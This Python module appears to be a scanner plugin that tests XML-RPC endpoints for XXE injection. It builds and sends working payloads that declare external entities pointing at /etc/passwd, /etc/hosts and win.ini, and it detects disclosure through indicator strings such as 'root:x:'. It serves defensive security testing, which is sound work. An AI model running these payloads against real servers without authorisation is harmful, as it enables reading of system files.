"""
XML-RPC XXE Injection test
"""

import html
import xmlrpc.client
from ptlibs.ptprinthelper import ptprint

__TESTLABEL__ = "XML-RPC XXE Injection test"


FILE_TARGETS = [
    {
        "name": "file:///etc/passwd",
        "uri": "file:///etc/passwd",
        "indicators": [
            "root:x:",
            "root:*:",
            "daemon:",
            "nobody:",
            "/bin/bash",
            "/bin/sh",
        ],
    },
    {
        "name": "file:///etc/hosts",
        "uri": "file:///etc/hosts",
        "indicators": [
            "127.0.0.1",
            "localhost",
            "::1",
        ],
    },
    {
        "name": "file:///C:/Windows/win.ini",
        "uri": "file:///C:/Windows/win.ini",
        "indicators": [
            "[fonts]",
            "[extensions]",
            "[mci extensions]",
        ],
    },
]

DOCTYPE_BLOCKED_INDICATORS = [
    "doctype is disallowed","doctype declarations are disallowed","dtd is prohibited","dtd is disabled",
    "disallow-doctype-decl","for security reasons dtd is prohibited","external entity is not allowed",
    "external entities are disabled","entity resolution disabled",
]

ENTITY_UNRESOLVED_INDICATORS = [
    "entity 'xxe' not defined","entity \"xxe\" not defined","undefined entity",
    "reference to undeclared entity","undeclared entity",
]

ENTITY_RESOLUTION_ERROR_INDICATORS = [
    "failed to load external entity","could not load external entity","cannot load external entity","no such file or directory",
    "permission denied","access is denied","i/o warning","ioerror","oserror","urlopen error","system entity",
]

XML_PARSE_ERROR_INDICATORS = [
    "xmlsyntaxerror","xml syntax error","parse error","not well-formed",
    "malformed xml","start tag expected","premature end",
]

DANGEROUS_METHOD_WORDS = [
    "delete","remove","create","new","insert","update","edit","set","change","write","reset","disable","enable",
]

PREFERRED_STRING_METHODS = [
    "echo","ping","getString","getValue","read","getText","getInfo",
]

MAX_OBSERVATIONS_TO_PRINT = 8


class XXETest:
    def __init__(self, args, ptjsonlib, helpers, http_client, common_tests):
        self.args = args
        self.ptjsonlib = ptjsonlib
        self.helpers = helpers
        self.http_client = http_client
        self.common_tests = common_tests
        self.helpers.print_header(__TESTLABEL__)

    def _has_any(self, text, indicators):
        if not text:
            return False
        low = text.lower()
        return any(ind.lower() in low for ind in indicators)

    def _response_excerpt(self, response, limit=240):
        if response is None:
            return ""
        return (response.text or "")[:limit].strip().replace("\n", " ").replace("\r", " ")

    def _normalise_type(self, typ):
        if not typ:
            return "string"

        t = str(typ).lower().strip()

        if ":" in t:
            t = t.split(":", 1)[-1]

        return t

    def _is_string_type(self, typ):
        return self._normalise_type(typ) in ("string", "str", "normalizedstring", "token")

    def _is_dangerous_method(self, method_name):
        low = (method_name or "").lower()
        return any(word in low for word in DANGEROUS_METHOD_WORDS)

    def _send_raw(self, payload):
        return self.helpers.send_xmlrpc_raw(data=payload)

    def _parse_xmlrpc_response(self, response):
        if response is None:
            return {
                "type": "NO_RESPONSE",
                "faultCode": None,
                "faultString": "",
            }

        raw = response.text or ""

        try:
            xmlrpc.client.loads(raw)
            return {
                "type": "SUCCESS",
                "faultCode": None,
                "faultString": "",
            }
        except xmlrpc.client.Fault as fault:
            return {
                "type": "FAULT",
                "faultCode": fault.faultCode,
                "faultString": fault.faultString or "",
            }
        except Exception as e:
            return {
                "type": "PARSE_ERROR",
                "faultCode": None,
                "faultString": str(e),
            }

    def _extract_param_types_from_signature(self, sig):

        if not sig:
            return None

        if isinstance(sig, list) and sig and isinstance(sig[0], (list, tuple)):
            first = list(sig[0])
            if len(first) >= 1:
                return first[1:]

        return None

    def _get_param_types_for_method(self, method_name):
        metadata = getattr(self.helpers, "metadata", {}) or {}

        if isinstance(metadata, dict):
            info = metadata.get(method_name)

            if isinstance(info, dict):
                param_types = info.get("param_types")
                if isinstance(param_types, list):
                    return param_types

                signature = info.get("signature")
                parsed = self._extract_param_types_from_signature(signature)
                if parsed is not None:
                    return parsed

        possible_attrs = [
            "method_signatures",
            "discovered_signatures",
            "method_signature_map",
            "signatures",
        ]

        for attr in possible_attrs:
            sigs = getattr(self.helpers, attr, None)
            if isinstance(sigs, dict) and method_name in sigs:
                sig = sigs[method_name]

                parsed = self._extract_param_types_from_signature(sig)
                if parsed is not None:
                    return parsed

                if isinstance(sig, list):
                    return sig

        return None

    def _default_value_for_type(self, typ):
        t = self._normalise_type(typ)

        if t in ("string", "str", "normalizedstring", "token"):
            return "xxe_baseline"

        if t in ("int", "i4", "i8", "integer", "long", "short"):
            return 1

        if t in ("double", "float", "decimal"):
            return 1.0

        if t in ("boolean", "bool"):
            return True

        if t in ("array", "list"):
            return []

        if t in ("struct", "dict"):
            return {}

        return "xxe_baseline"

    def _get_known_methods(self):
        methods = set()

        for m in getattr(self.helpers, "discovered_methods", []) or []:
            if isinstance(m, str):
                methods.add(m)

        metadata = getattr(self.helpers, "metadata", {}) or {}
        if isinstance(metadata, dict):
            for m in metadata.keys():
                if isinstance(m, str):
                    methods.add(m)

        return sorted(methods)

    def _select_string_param_method(self):
        methods = self._get_known_methods()

        for preferred in PREFERRED_STRING_METHODS:
            if preferred in methods and not self._is_dangerous_method(preferred):
                param_types = self._get_param_types_for_method(preferred)
                if param_types and any(self._is_string_type(t) for t in param_types):
                    return preferred, param_types, "metadata"

        for method in methods:
            if method.startswith("system."):
                continue

            if self._is_dangerous_method(method):
                continue

            param_types = self._get_param_types_for_method(method)

            if param_types and any(self._is_string_type(t) for t in param_types):
                return method, param_types, "metadata"

        if "process_data" in methods:
            return "process_data", ["string"], "fallback_process_data"

        if "ping" in methods:
            return "ping", ["string"], "fallback_ping_with_param"

        return None, None, "none"

    def _doctype(self, entity_uri):
        return f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{html.escape(entity_uri, quote=True)}">]>'

    def _build_baseline_ping(self):
        return (
            '<?xml version="1.0"?>'
            '<methodCall>'
            '<methodName>ping</methodName>'
            '<params></params>'
            '</methodCall>'
        )

    def _build_param_entity_payload(self, method_name, param_types, entity_uri):
        string_index = 0

        for i, typ in enumerate(param_types or []):
            if self._is_string_type(typ):
                string_index = i
                break

        params_xml = ""

        for i, typ in enumerate(param_types or ["string"]):
            if i == string_index:
                value_xml = "<string>&xxe;</string>"
            else:
                value = self._default_value_for_type(typ)
                value_escaped = html.escape(str(value), quote=False)
                value_xml = f"<string>{value_escaped}</string>"

            params_xml += f"<param><value>{value_xml}</value></param>"

        return (
            '<?xml version="1.0"?>'
            f'<!DOCTYPE foo ['
            f'<!ENTITY % pe SYSTEM "{html.escape(entity_uri, quote=True)}">'
            f'<!ENTITY xxe "%pe;">'
            f']>'
            '<methodCall>'
            f'<methodName>{html.escape(method_name, quote=False)}</methodName>'
            '<params>'
            f'{params_xml}'
            '</params>'
            '</methodCall>'
        )

    def _build_methodname_xxe_payload(self, entity_uri):

        return (
            '<?xml version="1.0"?>'
            f'{self._doctype(entity_uri)}'
            '<methodCall>'
            '<methodName>&xxe;</methodName>'
            '<params></params>'
            '</methodCall>'
        )

    def _build_string_param_xxe_payload(self, method_name, param_types, entity_uri):
        
        string_index = 0

        for i, typ in enumerate(param_types or []):
            if self._is_string_type(typ):
                string_index = i
                break

        params_xml = ""

        for i, typ in enumerate(param_types or ["string"]):
            if i == string_index:
                value_xml = "<string>&xxe;</string>"
            else:
                value = self._default_value_for_type(typ)
                value_escaped = html.escape(str(value), quote=False)
                value_xml = f"<string>{value_escaped}</string>"

            params_xml += f"<param><value>{value_xml}</value></param>"

        return (
            '<?xml version="1.0"?>'
            f'{self._doctype(entity_uri)}'
            '<methodCall>'
            f'<methodName>{html.escape(method_name, quote=False)}</methodName>'
            '<params>'
            f'{params_xml}'
            '</params>'
            '</methodCall>'
        )

    def _build_plain_entity_value_payload(self, method_name, entity_uri):
   
        return (
            '<?xml version="1.0"?>'
            f'{self._doctype(entity_uri)}'
            '<methodCall>'
            f'<methodName>{html.escape(method_name, quote=False)}</methodName>'
            '<params>'
            '<param><value>&xxe;</value></param>'
            '</params>'
            '</methodCall>'
        )

    def _build_payloads(self):
        method_name, param_types, source = self._select_string_param_method()

        payloads = []

        for target in FILE_TARGETS:
            uri = target["uri"]

            payloads.append({
                "name": f"{target['name']} in methodName",
                "target": target,
                "location": "methodName",
                "method": None,
                "payload": self._build_methodname_xxe_payload(uri),
            })

            if method_name:
                payloads.append({
                    "name": f"{target['name']} in string parameter",
                    "target": target,
                    "location": "string_parameter",
                    "method": method_name,
                    "methodSource": source,
                    "payload": self._build_string_param_xxe_payload(
                        method_name,
                        param_types,
                        uri,
                    ),
                })

                payloads.append({
                    "name": f"{target['name']} as raw value parameter",
                    "target": target,
                    "location": "raw_value_parameter",
                    "method": method_name,
                    "methodSource": source,
                    "payload": self._build_plain_entity_value_payload(
                        method_name,
                        uri,
                    ),
                })
                
                payloads.append({
                    "name": f"{target['name']} via parameter entity",
                    "target": target,
                    "location": "parameter_entity",
                    "method": method_name,
                    "methodSource": source,
                    "payload": self._build_param_entity_payload(
                        method_name,
                        param_types,
                        uri,
                    ),
                })

        return payloads

    def _classify_response(self, response, target):

        parsed = self._parse_xmlrpc_response(response)

        if response is None:
            return "NO_RESPONSE", parsed

        raw_body = response.text or ""
        fault_text = parsed.get("faultString", "") or ""
        combined = f"{fault_text}\n{raw_body}"

        if self._has_any(combined, target.get("indicators", [])):
            return "XXE_FILE_DISCLOSURE", parsed

        if self._has_any(combined, DOCTYPE_BLOCKED_INDICATORS):
            return "DOCTYPE_BLOCKED", parsed

        if self._has_any(combined, ENTITY_UNRESOLVED_INDICATORS):
            return "ENTITY_UNRESOLVED", parsed

        if self._has_any(combined, ENTITY_RESOLUTION_ERROR_INDICATORS):
            return "ENTITY_RESOLUTION_ERROR", parsed

        if self._has_any(combined, XML_PARSE_ERROR_INDICATORS):
            return "XML_PARSE_ERROR", parsed

        return "NO_XXE_EVIDENCE", parsed

    def _finding_to_text(self, finding):
        return (
            f"XXE file disclosure detected via {finding['location']} "
            f"({finding['target']})."
        )

    def _observation_to_text(self, observation):
        return observation.get("message", "XXE observation.")

    def run(self):
        findings = []
        observations = []

        baseline = self._send_raw(self._build_baseline_ping())

        if baseline is None:
            ptprint("Could not complete XXE test (no baseline response).",
                    "INFO", not self.args.json, indent=4)
            return

        baseline_parsed = self._parse_xmlrpc_response(baseline)

        observations.append({
            "type": "BASELINE_RESPONSE",
            "httpStatus": baseline.status_code,
            "xmlRpcResponseType": baseline_parsed["type"],
            "message": (
                "Baseline XML-RPC request received a response from the endpoint."
            ),
        })

        payloads = self._build_payloads()

        if not payloads:
            ptprint("No XXE payloads could be generated.", "INFO",
                    not self.args.json, indent=4)
            return

        for payload_info in payloads:
            r = self._send_raw(payload_info["payload"])

            classification, parsed = self._classify_response(
                r,
                payload_info["target"],
            )

            record = {
                "payload": payload_info["name"],
                "location": payload_info["location"],
                "method": payload_info.get("method"),
                "methodSource": payload_info.get("methodSource"),
                "target": payload_info["target"]["name"],
                "classification": classification,
                "httpStatus": r.status_code if r is not None else None,
                "xmlRpcResponseType": parsed["type"],
                "faultCode": parsed.get("faultCode"),
            }

            if classification == "XXE_FILE_DISCLOSURE":
                finding = {
                    **record,
                    "type": "XXE_FILE_DISCLOSURE",
                    "responseExcerpt": self._response_excerpt(r),
                    "message": (
                        "Response contains content indicators from the targeted "
                        "local file, which confirms external entity expansion."
                    ),
                }
                findings.append(finding)

            elif classification == "DOCTYPE_BLOCKED":
                observations.append({
                    **record,
                    "type": "DOCTYPE_BLOCKED",
                    "message": (
                        "Server response indicates that DOCTYPE/DTD processing "
                        "was blocked."
                    ),
                })

            elif classification == "ENTITY_UNRESOLVED":
                observations.append({
                    **record,
                    "type": "ENTITY_UNRESOLVED",
                    "message": (
                        "Server response indicates that the external entity was "
                        "not resolved or not declared."
                    ),
                })

            elif classification == "ENTITY_RESOLUTION_ERROR":
                observations.append({
                    **record,
                    "type": "ENTITY_RESOLUTION_ERROR",
                    "responseExcerpt": self._response_excerpt(r),
                    "message": (
                        "Server response suggests the XML parser attempted "
                        "external entity resolution, but direct file disclosure "
                        "was not observed."
                    ),
                })

            elif classification == "XML_PARSE_ERROR":
                observations.append({
                    **record,
                    "type": "XML_PARSE_ERROR",
                    "message": (
                        "Server returned XML parse error for XXE payload."
                    ),
                })

            elif classification == "NO_RESPONSE":
                observations.append({
                    **record,
                    "type": "NO_RESPONSE",
                    "message": (
                        "No response received for XXE payload."
                    ),
                })

            else:
                observations.append({
                    **record,
                    "type": "NO_XXE_EVIDENCE",
                    "message": (
                        "No direct XXE evidence observed for this payload."
                    ),
                })

        if findings:
            ptprint("XML-RPC XXE vulnerability detected.", "VULN",
                    not self.args.json, indent=4, colortext=True)

            grouped_findings = self._group_findings_for_console(findings)

            for group in grouped_findings:
                locations = ", ".join(group["locations"])

                extra = ""
                if group["methods"]:
                    extra = f" Methods used: {', '.join(group['methods'])}."

                ptprint(
                    f"  {group['target']} disclosed via: {locations}.{extra}",
                    "VULN",
                    not self.args.json,
                    indent=4,
                )

            self.ptjsonlib.add_vulnerability(
                "PTV-XMLRPC-XXE",
                node_key=self.helpers.node_key,
                data={
                    "summary": "XML-RPC XXE file disclosure was observed.",
                    "description": (
                        "The XML-RPC endpoint expanded an external XML entity "
                        "and returned indicators from a local file in the response."
                    ),
                    "confidence": "direct evidence",
                    "findingCount": len(findings),
                    "observationCount": len(observations),
                    "findings": findings,
                    "observations": observations,
                    "note": (
                        "A finding is reported only when local file content "
                        "indicators are observed in the response. Parser errors "
                        "and blocked DOCTYPE responses are stored as observations."
                    ),
                },
            )
            return
        
        meaningful_observations = [
            obs for obs in observations
            if obs.get("type") in (
                "DOCTYPE_BLOCKED",
                "ENTITY_UNRESOLVED",
                "ENTITY_RESOLUTION_ERROR",
                "XML_PARSE_ERROR",
            )
        ]

        ptprint("No direct XML-RPC XXE file disclosure observed.",
                "OK", not self.args.json, indent=4)

        for obs in meaningful_observations[:MAX_OBSERVATIONS_TO_PRINT]:
            ptprint(f"  {self._observation_to_text(obs)}",
                    "INFO", not self.args.json, indent=4)

        self.ptjsonlib.add_properties(
            properties={
                "xmlrpcXXETest": {
                    "status": "no_direct_file_disclosure_observed",
                    "findingCount": 0,
                    "observationCount": len(observations),
                    "observations": observations,
                    "note": (
                        "No direct XXE file disclosure was observed with the "
                        "tested payloads. This does not prove that all XXE "
                        "vectors are impossible."
                    ),
                }
            },
            node_key=self.helpers.node_key,
        )

    def _group_findings_for_console(self, findings):
        grouped = {}

        for f in findings:
            target = f.get("target", "unknown target")

            if target not in grouped:
                grouped[target] = {
                    "target": target,
                    "locations": [],
                    "methods": [],
                }

            location = f.get("location")
            if location and location not in grouped[target]["locations"]:
                grouped[target]["locations"].append(location)

            method = f.get("method")
            if method and method not in grouped[target]["methods"]:
                grouped[target]["methods"].append(method)

        return list(grouped.values())


def run(args, ptjsonlib, helpers, http_client, common_tests):
    XXETest(args, ptjsonlib, helpers, http_client, common_tests).run()